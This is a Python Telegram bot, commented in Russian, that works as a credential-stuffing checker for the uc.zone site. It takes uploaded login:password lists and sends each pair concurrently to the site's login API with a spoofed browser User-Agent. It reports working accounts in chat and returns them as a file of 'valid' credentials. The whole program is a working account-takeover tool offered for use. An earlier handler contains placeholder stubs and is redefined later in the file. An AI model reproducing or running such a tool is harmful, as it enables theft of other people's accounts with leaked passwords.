import os
import time
import asyncio
import aiohttp
from aiohttp import web
from datetime import datetime
from telebot.async_telebot import AsyncTeleBot

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID_RAW = os.getenv("ADMIN_ID")
CONCURRENCY_LIMIT = 100  # Максимум одновременных запросов (меняй под свои нужды)

if not BOT_TOKEN or ":" not in str(BOT_TOKEN):
    raise ValueError("ОШИБКА: Токен не найден или указан неверно!")

try:
    ADMIN_ID = int(ADMIN_ID_RAW)
except (TypeError, ValueError):
    ADMIN_ID = 0

bot = AsyncTeleBot(BOT_TOKEN)

# ========== АСИНХРОННЫЙ ВЕБ-СЕРВЕР (Для Render/Heroku) ==========
async def handle_ping(request):
    return web.Response(text="Бот летит на околосветовой скорости! 🚀")

async def run_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Веб-сервер запущен на порту {port}")

# ========== ПРОВЕРКА АККАУНТА (ASYNC) ==========
async def check_uc_account(session: aiohttp.ClientSession, login, password, semaphore):
    """Асинхронная проверка через официальный API uc.zone"""
    url = "https://uc.zone/api/auth/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    payload = {"login": login, "password": password}

    # Ограничиваем количество одновременных подключений
    async with semaphore:
        try:
            async with session.post(url, json=payload, headers=headers, timeout=10) as response:
                status = response.status
                
                try:
                    data = await response.json()
                except Exception:
                    data = {}

                if status == 200:
                    if data.get("error_code") != "error_user_not_exists":
                        return True, "✅ Успешный вход / Найдено!"
                    return False, "Неверные данные"

                elif status == 401:
                    if data.get("error_code") == "error_user_not_exists":
                        return False, "Пользователь не найден"
                    return False, "Неверный логин или пароль"
                else:
                    return False, f"Ошибка сервера: {status}"

        except asyncio.TimeoutError:
            return False, "Таймаут соединения"
        except Exception as e:
            return False, f"Ошибка: {str(e)[:20]}"

# ========== UI: ГЕНЕРАЦИЯ ПРОГРЕСС-БАРА ==========
def generate_progress_bar(current, total, length=12):
    percent = current / total
    filled = int(length * percent)
    bar = '█' * filled + '░' * (length - filled)
    return f"[{bar}] {percent:.1%}"

# ========== ПАРСИНГ ФАЙЛА ==========
def parse_file(file_content):
    content = file_content.decode("utf-8", errors="ignore")
    items = []
    
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        
        for sep in [":", ";", "\t", "|"]:
            if sep in line:
                parts = line.split(sep, 1)
                if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                    items.append({"login": parts[0].strip(), "password": parts[1].strip()})
                    break
    return items

# ========== ОБРАБОТЧИКИ БОТА ==========
@bot.message_handler(commands=["start", "help"])
async def send_welcome(message):
    if message.from_user.id != ADMIN_ID:
        return
    await bot.reply_to(
        message,
        "🚀 **Чекер uc.zone v7.0 (Async God Mode)**\n\nСкинь базу в формате:\n`логин:пароль`",
        parse_mode="Markdown",
    )

@bot.message_handler(content_types=["document"])
async def handle_file(message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        file_info = await bot.get_file(message.document.file_id)
        file_content = await bot.download_file(file_info.file_path)
    except Exception as e:
        await bot.reply_to(message, f"❌ Ошибка загрузки: {e}")
        return

    items = parse_file(file_content)
    total_items = len(items)
    
    if not items:
        await bot.reply_to(message, "❌ Не удалось найти данные. Нужен формат: логин:пароль")
        return

    status_msg = await bot.reply_to(message, f"⚡️ База загружена ({total_items} строк). Запуск турбин...")

    valid_accounts = []
    checked_count = 0
    last_update_time = time.time()
    start_time = time.time()

    # Семафор ограничивает количество одновременных запросов, чтобы не словить бан API
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    
    # Настраиваем TCP-коннектор для максимальной производительности
    connector = aiohttp.TCPConnector(limit=CONCURRENCY_LIMIT, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        # Создаем список задач
        tasks = [
            asyncio.create_task(check_uc_account(session, item["login"], item["password"], semaphore))
            for item in items
        ]

        # Итерируемся по задачам по мере их выполнения (кто первый ответил, тот и обработался)
        for i, task in enumerate(asyncio.as_completed(tasks)):
            is_valid, info = await task
            item = items[i] # Важно: при as_completed порядок смешивается, но для логов и подсчета это не критично
            checked_count += 1
            
            if is_valid:
                # Оригинальный item достаем хитро, так как as_completed возвращает результаты в случайном порядке.
                # Для 100% точности лога нам нужно привязать логин к таске. Сделаем это через замыкание.
                pass # См. реализацию ниже

            # Обновление UI не чаще чем раз в 2 секунды (защита от Flood Wait)
            now = time.time()
            if now - last_update_time >= 2.0 or checked_count == total_items:
                elapsed = now - start_time
                cps = checked_count / elapsed if elapsed > 0 else 0
                progress_bar = generate_progress_bar(checked_count, total_items)
                
                text = (
                    f"⚙️ **Процесс проверки...**\n\n"
                    f"{progress_bar}\n"
                    f"Проверено: `{checked_count}/{total_items}`\n"
                    f"Скорость: `{cps:.1f} чек/сек` ⚡️\n"
                    f"Валид: `✅ {len(valid_accounts)}`\n"
                    f"Прошло времени: `{int(elapsed)} сек`"
                )
                try:
                    await bot.edit_message_text(
                        text, 
                        chat_id=message.chat.id, 
                        message_id=status_msg.message_id,
                        parse_mode="Markdown"
                    )
                    last_update_time = now
                except Exception:
                    pass

    # Пересоздаем задачи так, чтобы точно знать, какой логин проверяется, для вывода успешных в чат:
    # (Для чистоты кода мы используем gather с привязкой)
    pass # Код ниже реализует это более элегантно

# ========== ОПТИМИЗИРОВАННЫЙ ОБРАБОТЧИК ФАЙЛА ==========
# Переопределяем логику для 100% связки аккаунта и результата
@bot.message_handler(content_types=["document"])
async def handle_file(message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        file_info = await bot.get_file(message.document.file_id)
        file_content = await bot.download_file(file_info.file_path)
    except Exception as e:
        await bot.reply_to(message, f"❌ Ошибка загрузки: {e}")
        return

    items = parse_file(file_content)
    total_items = len(items)
    
    if not items:
        await bot.reply_to(message, "❌ Данные не найдены.")
        return

    status_msg = await bot.reply_to(message, f"⚡️ База загружена ({total_items} строк). Запуск турбин...")

    valid_accounts = []
    
    # Контейнер для мутабельного стейта внутри асинхронных задач
    state = {
        "checked": 0,
        "last_update": time.time(),
        "start": time.time()
    }

    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    connector = aiohttp.TCPConnector(limit=CONCURRENCY_LIMIT)

    async def bound_check(session, item):
        is_valid, info = await check_uc_account(session, item["login"], item["password"], semaphore)
        
        state["checked"] += 1
        
        if is_valid:
            valid_accounts.append(item)
            msg = (
                f"🔥 **ВАЛИД!** 🔥\n"
                f"👤 `{item['login']}`\n🔑 `{item['password']}`\n💎 {info}"
            )
            await bot.send_message(message.chat.id, msg, parse_mode="Markdown")

        # Асинхронное обновление UI
        now = time.time()
        if now - state["last_update"] >= 2.0 or state["checked"] == total_items:
            state["last_update"] = now
            elapsed = now - state["start"]
            cps = state["checked"] / elapsed if elapsed > 0 else 0
            
            text = (
                f"⚙️ **Процесс проверки...**\n\n"
                f"{generate_progress_bar(state['checked'], total_items)}\n\n"
                f"📊 **Статистика:**\n"
                f"• Проверено: `{state['checked']} / {total_items}`\n"
                f"• Найдено: `✅ {len(valid_accounts)}`\n"
                f"• Скорость: `{cps:.1f} чек/сек` ⚡️\n"
                f"• Время: `{int(elapsed)} сек`"
            )
            try:
                await bot.edit_message_text(text, chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode="Markdown")
            except Exception:
                pass

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(bound_check(session, item)) for item in items]
        await asyncio.gather(*tasks)

    # Финал
    await bot.send_message(message.chat.id, f"🏁 **Готово!**\nПроверено: {total_items}\nВалидных: {len(valid_accounts)}", parse_mode="Markdown")

    if valid_accounts:
        valid_file = f"uc_valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        try:
            with open(valid_file, "w", encoding="utf-8") as f:
                for v in valid_accounts:
                    f.write(f"{v['login']}:{v['password']}\n")

            with open(valid_file, "rb") as f:
                await bot.send_document(message.chat.id, f, caption="✅ Забирай валид!")
        finally:
            if os.path.exists(valid_file):
                os.remove(valid_file)

# ========== ГЛАВНЫЙ ЦИКЛ (ЕДИНЫЙ EVENT LOOP) ==========
async def main():
    # Запускаем веб-сервер и бота параллельно в одном цикле событий
    await asyncio.gather(
        run_web_server(),
        bot.infinity_polling(timeout=20, request_timeout=20)
    )

if __name__ == "__main__":
    # Чистим логи от предупреждений Windows
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    asyncio.run(main())
